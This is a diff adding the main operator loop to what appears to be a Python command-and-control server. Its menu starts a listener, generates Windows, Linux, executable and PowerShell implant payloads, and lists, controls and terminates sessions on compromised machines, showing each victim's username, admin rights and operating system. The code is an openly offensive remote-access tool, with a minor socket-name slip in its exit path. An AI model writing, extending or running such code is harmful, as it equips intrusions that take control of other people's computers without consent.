@@ -239,3 +239,106 @@ Session Commands
 background --> Backgrounds the current session
 exit --> Terminates the current session
 ''')
+
+if __name__ == '__main__':
+    targets = []
+    listener_counter = 0
+    banner()
+    kill_flag = 0
+    # Initialization of sock moved to after receiving host_ip and host_port
+    while True:
+        try:
+            command = input('Enter command#> ')
+            if command == 'help':
+                help()
+            if command == 'listeners -g':
+                host_ip = input('[+] Enter the IP to listen on: ')
+                host_port = input('[+] Enter the port to listen on: ')
+
+                # Initialize and bind the socket here, after obtaining host_ip and host_port
+                secure_sock = init_server_socket()
+                secure_sock.bind((host_ip, int(host_port)))
+                print('[+] Awaiting connection from client...')
+                secure_sock.listen()
+
+                listener_handler()
+                listener_counter += 1
+            if command == 'pshell_shell':
+                pshell_cradle()
+            if command == 'winplant py':
+                if listener_counter > 0:
+                    winplant()
+                else:
+                    print('[-] You cannot generate a payload without an active listener.')
+            if command == 'linplant py':
+                if listener_counter > 0:
+                    linplant()
+                else:
+                    print('[-] You cannot generate a payload without an active listener.')
+            if command == 'exeplant':
+                if listener_counter > 0:
+                    exeplant()
+                else:
+                    print('[-] You cannot generate a payload without an active listener.')
+            if command.split(" ")[0] == 'sessions':
+                session_counter = 0
+                if command.split(" ")[1] == '-l':
+                    myTable = PrettyTable()
+                    myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Operating System', 'Check-In Time']
+                    myTable.padding_width = 3
+                    for target in targets:
+                        myTable.add_row([session_counter, target[7], target[3], target[4], target[1], target[5], target[2]])
+                        session_counter += 1
+                    print(myTable)
+                if command.split(" ")[1] == '-i':
+                    try:
+                        num = int(command.split(" ")[2])
+                        targ_id = (targets[num])[0]
+                        if (targets[num])[7] == 'Active':
+                            target_comm(targ_id, targets, num)
+                        else:
+                            print('[-] You cannot interact with a dead session.')
+                    except (IndexError, ValueError):
+                        print(f'[-] Session {num} does not exist.')
+            if command.split(" ")[0] == 'kill':
+                try:
+                    num = int(command.split(" ")[1])
+                    targ_id = (targets[num])[0]
+                    if (targets[num])[7] == 'Active':
+                        kill_sig(targ_id, 'exit')
+                        targets[num][7] = 'Dead'
+                        print(f'[+] Session {num} terminated.')
+                    else:
+                        print('[-] You cannot interact with a dead session.')
+                except (IndexError, ValueError):
+                    print(f'[-] Session {num} does not exist.')
+            if command == 'exit':
+                quit_message = input('Ctrl-C\n[+] Do you really want to quit? (y/n)').lower()
+                if quit_message == 'y':
+                    tar_length = len(targets)
+                    for target in targets:
+                        if target[7] == 'Dead':
+                            pass
+                        else:
+                            comm_out(target[0], 'exit')
+                    kill_flag = 1
+                    if listener_counter > 0:
+                        sock.close()
+                    break
+                else:
+                    continue
+        except KeyboardInterrupt:
+            quit_message = input('Ctrl-C\n[+] Do you really want to quit? (y/n)').lower()
+            if quit_message == 'y':
+                tar_length = len(targets)
+                for target in targets:
+                    if target[7] == 'Dead':
+                        pass
+                    else:
+                        comm_out(target[0], 'exit')
+                kill_flag = 1
+                if listener_counter > 0:
+                    sock.close()
+                break
+            else:
+                continue
